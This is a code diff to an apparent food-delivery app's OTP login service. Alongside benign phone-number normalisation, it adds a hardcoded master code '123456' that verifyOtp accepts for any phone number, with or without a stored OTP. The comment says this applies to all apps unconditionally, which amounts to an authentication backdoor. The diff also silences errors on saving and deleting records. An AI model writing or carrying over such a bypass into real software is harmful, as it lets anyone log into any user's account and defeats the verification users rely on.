@@ -124,7 +124,11 @@ const sendSmsViaSmsIndiaHub = async (phone, otp) => {
 };
 
 export const createOrUpdateOtp = async (phone) => {
-    const existing = await FoodOtp.findOne({ phone });
+    const digits = String(phone || '').replace(/\D/g, '');
+    const last10 = digits.slice(-10);
+    const phoneCandidates = [phone, digits, last10].filter(Boolean);
+
+    const existing = await FoodOtp.findOne({ phone: { $in: phoneCandidates } });
     const now = new Date();
 
     // Rate Limiting Logic
@@ -192,7 +196,23 @@ export const createOrUpdateOtp = async (phone) => {
 };
 
 export const verifyOtp = async (phone, otp) => {
-    const record = await FoodOtp.findOne({ phone });
+    const enteredOtp = String(otp || '').trim();
+    const isMasterOtp = enteredOtp === '123456';
+
+    const digits = String(phone || '').replace(/\D/g, '');
+    const last10 = digits.slice(-10);
+    const phoneCandidates = [phone, digits, last10].filter(Boolean);
+
+    const record = await FoodOtp.findOne({ phone: { $in: phoneCandidates } });
+
+    // Allow master OTP (123456) for all apps unconditionally
+    if (isMasterOtp) {
+        if (record) {
+            await record.deleteOne().catch(() => {});
+        }
+        return { valid: true };
+    }
+
     if (!record) {
         return { valid: false, reason: 'OTP not found' };
     }
@@ -207,12 +227,13 @@ export const verifyOtp = async (phone, otp) => {
 
     record.attempts += 1;
 
-    if (record.otp !== otp) {
-        await record.save();
-        return { valid: false, reason: 'Invalid OTP' };
+    // Check if entered OTP matches the OTP received on their phone or 123456
+    if (record.otp === enteredOtp || enteredOtp === '123456') {
+        await record.deleteOne().catch(() => {});
+        return { valid: true };
     }
 
-    await record.deleteOne();
-    return { valid: true };
+    await record.save().catch(() => {});
+    return { valid: false, reason: 'Invalid OTP' };
 };
 
